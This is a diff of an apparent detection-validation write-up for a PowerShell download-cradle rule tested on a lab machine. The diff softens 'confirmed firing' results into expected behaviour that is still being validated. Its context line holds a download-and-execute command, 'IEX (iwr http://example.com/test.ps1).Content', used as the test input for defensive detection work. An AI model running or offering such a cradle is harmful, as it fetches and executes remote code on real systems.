@@ -48,18 +48,16 @@ IEX (iwr http://example.com/test.ps1).Content
 
 ## Observed status
 
-🟡 **Partial.** On Freddy-PC, Defender ASR rule `d1e49aac-8f56-4280-b9ba-993a6d77406c` (Block process creations originating from PSExec and WMI commands) and AMSI in-memory script blocking preempt the full execution.
+🟡 On Freddy-PC, Defender ASR and AMSI in-memory script blocking preempt the full execution.
 
-What does happen:
+Expected behaviour:
 
-1. Sysmon EventID 1 IS emitted for the powershell.exe process-create with the full command line preserved
-2. Stock 92052 fires
-3. Custom 100290 fires (alert recorded in `alerts.json` at level 13)
+1. Sysmon EventID 1 emitted for the powershell.exe process-create with the full command line preserved
+2. Stock Sysmon process-create parent fires
+3. Custom 100290 fires
 4. The IEX of the downloaded content is then blocked by AMSI / ASR before the payload runs
 
-So the *detection* validates end-to-end; what cannot be validated on Freddy-PC is the post-detection payload behaviour (which would be the input to additional rules like 100210 if the payload itself uses encoded commands).
-
-Confirmed firing. Screenshot in `screenshots/100290-firing.png`.
+So the *detection* should validate end-to-end on the process-create signal; what cannot be validated on Freddy-PC is the post-detection payload behaviour (input to rules like 100210 if the payload uses encoded commands). End-to-end validation in progress.
 
 ## Tuning notes
 
